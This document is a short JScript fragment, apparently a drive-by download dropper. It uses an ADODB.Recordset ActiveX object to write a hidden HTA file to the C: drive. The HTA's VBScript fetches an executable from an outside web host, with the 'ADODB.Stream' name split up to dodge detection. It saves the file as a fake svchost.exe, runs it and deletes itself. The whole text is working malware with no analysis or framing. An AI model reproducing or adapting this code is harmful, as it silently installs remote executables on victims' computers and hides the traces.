evanchik = new ActiveXObject("ADODB.Recordset");
evanchik.Fields.Append ("evanchik", 200, "3000");      
evanchik.Open;             
evanchik.AddNew;       
evanchik.Fields("evanchik").Value =("<HTML><BODY><HEAD><SCRIPT language=JScript>window.moveTo(3000,3000);window.resizeTo(0,0);</SCRIPT></HEAD>\r\n<HTA:APPLICATION ID=ICY BORDER=none CAPTION=no SHOWINTASKBAR=no>\r\n<SCRIPT LANGUAGE=vbScript>\r\non error resume next\r\ndim iurl:dim x:dim xshell:dim s\r\niurl=\"http://www.sonokong.co.kr/counter/test.exe\"\r\nSet x= CreateObject(\"Microsoft.XMLHTTP\")\r\nx.Open \"GET\",iurl,0\r\nSet s = CreateObject(\"A\"&\"D\"&\"O\"&\"D\"&\"B\"&\".\"&\"S\"&\"t\"&\"r\"&\"e\"&\"a\"&\"m\")\r\nx.Send()\r\ns.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody)\r\ns.SaveToFile \"c:\\svchost.exe\",2\r\nfor o = 1 to 10000:next:set xshell= createobject(\"shell.application\")\r\nxShell.NameSpace(\"c:\\\").Items().Item(\"svchost.exe\").InvokeVerb()\r\nxShell.ShellExecute \"cmd.exe\", \"/c del c:\\lhxyvbs.hta\",\"\\\",\"\",0\r\n</SCRIPT></BODY></HTML>\r\n");   
evanchik.Update; 
try {
evanchik.Save("C:\\lhxyvbs.hta", 0);
} 
catch(e) 
{ } 
evanchik.Close;
